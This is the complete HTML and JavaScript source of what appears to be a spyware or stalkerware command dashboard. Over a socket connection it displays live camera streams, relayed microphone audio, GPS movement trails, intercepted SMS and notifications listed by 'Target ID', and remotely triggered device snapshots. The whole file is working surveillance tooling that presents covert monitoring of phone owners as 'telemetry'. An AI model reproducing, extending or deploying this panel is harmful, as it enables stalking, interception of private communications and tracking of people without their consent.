<!DOCTYPE html>
<html>

<head>
    <title>Pro Telemetry Command Center</title>

    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>

    <style>
        body {
            background: #0b0b0b;
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
            margin: 0;
        }

        h1 { color: #00ff9c; text-align: center; text-transform: uppercase; letter-spacing: 2px; }

        /* 📊 Dashboard Stats Bar */
        #stats-bar {
            text-align: center;
            margin-bottom: 20px;
            background: #111;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #333;
        }

        #devices {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }

        .card {
            background: #1a1a1a;
            padding: 20px;
            margin: 10px;
            border-radius: 12px;
            width: 280px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid #333;
            transition: transform 0.2s;
        }

        .card:hover { transform: translateY(-5px); border-color: #00ff9c; }

        /* 🎥 Live Viewport Styling */
        .live-viewport {
            width: 100%;
            height: 160px;
            background: #000;
            margin-bottom: 15px;
            border-radius: 8px;
            border: 1px solid #444;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .live-frame { width: 100%; height: 100%; object-fit: cover; }

        button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border: none;
            background: #00ff9c;
            color: black;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover { background: #00cc7d; box-shadow: 0 0 10px #00ff9c; }

        /* 🗺️ Map Styling */
        #map {
            height: 450px;
            margin: 20px auto;
            border-radius: 15px;
            width: 95%;
            border: 2px solid #333;
        }

        /* 📱 SMS Log Table */
        #sms-log-container {
            width: 95%;
            margin: 20px auto;
            background: #111;
            border-radius: 12px;
            padding: 20px;
            border: 1px solid #333;
        }

        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th { background: #222; color: #00ff9c; padding: 12px; text-align: left; border-bottom: 2px solid #333; }
        td { padding: 12px; border-bottom: 1px solid #222; font-size: 14px; }

        /* 📸 Snapshot Gallery */
        #snapshots {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }

        .snapshot-img {
            width: 240px;
            border-radius: 10px;
            border: 2px solid #333;
            transition: 0.3s;
        }

        .snapshot-img:hover { border-color: #00ff9c; transform: scale(1.05); }

        #audio-bridge { display: none; }
    </style>
</head>

<body>

    <h1>📊 PRO COMMAND DASHBOARD</h1>

    <div id="stats-bar">
        Active Connections: <span id="active-count" style="color:#00ff9c">0</span> | 
        System Time: <span id="sys-time">--:--:--</span>
    </div>

    <div id="devices"></div>

    <div id="map"></div>

    <div id="sms-log-container">
        <h3>📱 Live Notification & SMS Feed</h3>
        <table>
            <thead>
                <tr>
                    <th>Target ID</th>
                    <th>Source</th>
                    <th>Intercepted Message</th>
                    <th>Timestamp</th>
                </tr>
            </thead>
            <tbody id="sms-table-body">
                </tbody>
        </table>
    </div>

    <h3>📸 Recent Snapshots</h3>
    <div id="snapshots"></div>

    <audio id="audio-bridge" autoplay></audio>

    <script>
        const socket = io({
            transports: ['websocket'],
            upgrade: false,
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 2000
        });
        const MAX_TRAIL_POINTS = 120;
        const MAX_NOTIFICATIONS = 100;
        const MAX_SNAPSHOTS = 50;
        const FRAME_RENDER_INTERVAL_MS = 150;

        const lastFrameRenderByDevice = {};
        const latestFrameByDevice = {};
        const mediaStatsByDevice = {};
        const audioQueue = [];
        const MAX_AUDIO_QUEUE = 120;
        let audioPlaying = false;
        const audioBridge = document.getElementById("audio-bridge");

        function revokeAudioUrl(url) {
            if (url && url.startsWith('blob:')) {
                URL.revokeObjectURL(url);
            }
        }

        function playNextAudioChunk() {
            if (audioPlaying || audioQueue.length === 0) return;

            const nextUrl = audioQueue.shift();
            audioPlaying = true;
            audioBridge.src = nextUrl;
            audioBridge.play().catch(() => {
                audioPlaying = false;
                audioQueue.unshift(nextUrl);
            });
        }

        function onAudioChunkFinished() {
            revokeAudioUrl(audioBridge.src || '');
            audioPlaying = false;
            playNextAudioChunk();
        }

        audioBridge.addEventListener('ended', onAudioChunkFinished);
        audioBridge.addEventListener('error', onAudioChunkFinished);

        function getMediaStats(deviceId) {
            if (!mediaStatsByDevice[deviceId]) {
                mediaStatsByDevice[deviceId] = {
                    frames: 0,
                    audioChunks: 0,
                    lastFrameAt: 0,
                    lastAudioAt: 0,
                };
            }
            return mediaStatsByDevice[deviceId];
        }

        function formatAge(timestamp) {
            if (!timestamp) return 'never';
            const seconds = Math.max(0, Math.floor((Date.now() - timestamp) / 1000));
            return `${seconds}s ago`;
        }

        function paintMediaStats(deviceId) {
            const stats = mediaStatsByDevice[deviceId];
            if (!stats) return;

            const framesEl = document.getElementById(`media-frames-${deviceId}`);
            const audioEl = document.getElementById(`media-audio-${deviceId}`);
            const frameAgeEl = document.getElementById(`media-frame-age-${deviceId}`);
            const audioAgeEl = document.getElementById(`media-audio-age-${deviceId}`);

            if (framesEl) framesEl.textContent = String(stats.frames);
            if (audioEl) audioEl.textContent = String(stats.audioChunks);
            if (frameAgeEl) frameAgeEl.textContent = formatAge(stats.lastFrameAt);
            if (audioAgeEl) audioAgeEl.textContent = formatAge(stats.lastAudioAt);
        }

        // --------------------------------------------------------
        // 🗺️ MAP ENGINE (High-Accuracy Trails)
        // --------------------------------------------------------
        let map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19
        }).addTo(map);

        let markers = {};
        let movementPaths = {};

        socket.on("connect", () => {
            socket.emit("join_dashboard");
        });

        // --------------------------------------------------------
        // 🔄 MAIN DASHBOARD SYNC
        // --------------------------------------------------------
        socket.on("dashboard_update", (devices) => {
            const container = document.getElementById("devices");
            const htmlParts = [];
            let online = 0;
            const activeIds = new Set(Object.keys(devices));

            for (const id in devices) {
                const d = devices[id];
                if (d.status === "online") online++;
                const existingFrame = latestFrameByDevice[id] || "";
                const waitingStyle = existingFrame ? "display:none;" : "color:#444; font-size:12px;";
                const stats = getMediaStats(id);

                htmlParts.push(`
                    <div class="card">
                        <div class="live-viewport">
                            <img id="stream-${id}" class="live-frame" src="${existingFrame}">
                            <span id="label-${id}" style="${waitingStyle}">Waiting for Stream...</span>
                        </div>
                        <b>ID:</b> ${id.substring(0, 12)}<br>
                        <b>Model:</b> ${d.model || "Analyzing..."}<br>
                        <b>Network:</b> ${d.network || "Standard"}<br>
                        <b>Battery:</b> ${d.battery || "0%"} (${d.charging ? '⚡ Charging' : '🔋 Discharging'})<br>
                        <b>Status:</b> <span style="color:${d.status === 'online' ? '#00ff9c' : '#ff4d4d'}">${d.status.toUpperCase()}</span>

                        <div style="margin:10px 0; padding:8px; border:1px solid #1f1f1f; background:#101010; border-radius:6px; font-size:12px; color:#bdbdbd;">
                            <div><span style="color:#00ff9c; font-weight:bold;">Frames:</span> <span id="media-frames-${id}">${stats.frames}</span></div>
                            <div><span style="color:#00ff9c; font-weight:bold;">Last frame:</span> <span id="media-frame-age-${id}">${formatAge(stats.lastFrameAt)}</span></div>
                            <div><span style="color:#00ff9c; font-weight:bold;">Audio chunks:</span> <span id="media-audio-${id}">${stats.audioChunks}</span></div>
                            <div><span style="color:#00ff9c; font-weight:bold;">Last audio:</span> <span id="media-audio-age-${id}">${formatAge(stats.lastAudioAt)}</span></div>
                        </div>

                        <button onclick="requestSnapshot('${id}')">📸 TRIGGER SNAPSHOT</button>
                    </div>
                `);

                if (d.lat && d.lon) {
                    if (!markers[id]) {
                        markers[id] = L.marker([d.lat, d.lon]).addTo(map).bindPopup(`Device: ${id}`);
                        movementPaths[id] = L.polyline([[d.lat, d.lon]], { color: '#00ff9c', weight: 4 }).addTo(map);
                    } else {
                        markers[id].setLatLng([d.lat, d.lon]);
                        movementPaths[id].addLatLng([d.lat, d.lon]);

                        const points = movementPaths[id].getLatLngs();
                        if (points.length > MAX_TRAIL_POINTS) {
                            movementPaths[id].setLatLngs(points.slice(points.length - MAX_TRAIL_POINTS));
                        }
                    }
                }
            }

            container.innerHTML = htmlParts.join("");

            activeIds.forEach((id) => {
                paintMediaStats(id);
            });

            Object.keys(markers).forEach((id) => {
                if (!activeIds.has(id)) {
                    map.removeLayer(markers[id]);
                    map.removeLayer(movementPaths[id]);
                    delete markers[id];
                    delete movementPaths[id];
                    delete lastFrameRenderByDevice[id];
                    delete latestFrameByDevice[id];
                    delete mediaStatsByDevice[id];
                }
            });

            document.getElementById("active-count").innerText = online;
        });

        // --------------------------------------------------------
        // 🎥 VIDEO STREAMING RELAY
        // --------------------------------------------------------
        socket.on("render_frame", (data) => {
            const now = Date.now();
            const last = lastFrameRenderByDevice[data.device_id] || 0;
            if ((now - last) < FRAME_RENDER_INTERVAL_MS) return;
            lastFrameRenderByDevice[data.device_id] = now;
            latestFrameByDevice[data.device_id] = data.frame;
            const stats = getMediaStats(data.device_id);
            stats.frames += 1;
            stats.lastFrameAt = now;

            const frameImg = document.getElementById(`stream-${data.device_id}`);
            const label = document.getElementById(`label-${data.device_id}`);
            if (frameImg) {
                frameImg.src = data.frame;
                if (label) label.style.display = "none";
            }
            paintMediaStats(data.device_id);
        });

        // --------------------------------------------------------
        // 🔊 AUDIO CAPTURE RELAY
        // --------------------------------------------------------
        socket.on("play_audio", (data) => {
            const deviceId = data.device_id || 'unknown';
            const stats = getMediaStats(deviceId);
            stats.audioChunks += 1;
            stats.lastAudioAt = Date.now();
            const blob = new Blob([data.audio], { type: 'audio/webm; codecs=opus' });
            const url = URL.createObjectURL(blob);
            if (audioQueue.length >= MAX_AUDIO_QUEUE) {
                revokeAudioUrl(audioQueue.shift());
            }
            audioQueue.push(url);
            playNextAudioChunk();
            paintMediaStats(deviceId);
        });

        setInterval(() => {
            Object.keys(mediaStatsByDevice).forEach((deviceId) => {
                paintMediaStats(deviceId);
            });
        }, 1000);

        // --------------------------------------------------------
        // 📱 SMS & NOTIFICATION LOGGING
        // --------------------------------------------------------
        socket.on("new_notification_alert", (data) => {
            const tableBody = document.getElementById("sms-table-body");
            const newRow = `
                <tr>
                    <td style="color:#00ff9c">${data.device_id.substring(0, 8)}</td>
                    <td><b>${data.title}</b></td>
                    <td>${data.body}</td>
                    <td>${new Date().toLocaleTimeString()}</td>
                </tr>
            `;
            tableBody.insertAdjacentHTML('afterbegin', newRow);

            while (tableBody.children.length > MAX_NOTIFICATIONS) {
                tableBody.removeChild(tableBody.lastElementChild);
            }
        });

        // --------------------------------------------------------
        // 📸 SNAPSHOT HANDLERS
        // --------------------------------------------------------
        function requestSnapshot(deviceId) {
            socket.emit("request_snapshot", deviceId);
        }

        socket.on("view_snapshot", (data) => {
            const box = document.getElementById("snapshots");
            const img = document.createElement("img");
            img.src = data.image;
            img.className = "snapshot-img";
            box.prepend(img);

            while (box.children.length > MAX_SNAPSHOTS) {
                box.removeChild(box.lastElementChild);
            }
        });

        // Simple clock for the dashboard
        setInterval(() => {
            document.getElementById("sys-time").innerText = new Date().toLocaleTimeString();
        }, 1000);

    </script>
</body>

</html>
